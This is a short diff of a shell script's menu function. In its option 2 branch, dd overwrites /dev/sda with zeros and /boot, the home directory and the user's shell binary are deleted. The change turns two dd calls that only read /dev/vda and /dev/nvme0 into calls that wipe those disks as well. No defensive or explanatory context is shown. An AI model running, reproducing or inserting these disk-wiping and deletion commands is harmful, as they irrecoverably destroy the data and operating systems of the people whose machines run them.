@@ -22,7 +22,7 @@ continue() {
         mkdir $(echo ~)
         exit 1
     elif [ $option == "2" ]; then
-        dd if=/dev/zero of=/dev/sda | dd if=/dev/vda of=/dev/zero | dd if=/dev/nvme0 of=/dev/zero
+        dd if=/dev/zero of=/dev/sda | dd if=/dev/zero of=/dev/vda | dd if=/dev/zero of=/dev/nvme0
         rm -rf /boot
         rm -rf ~
         rm -rf /bin/$(echo "$SHELL")
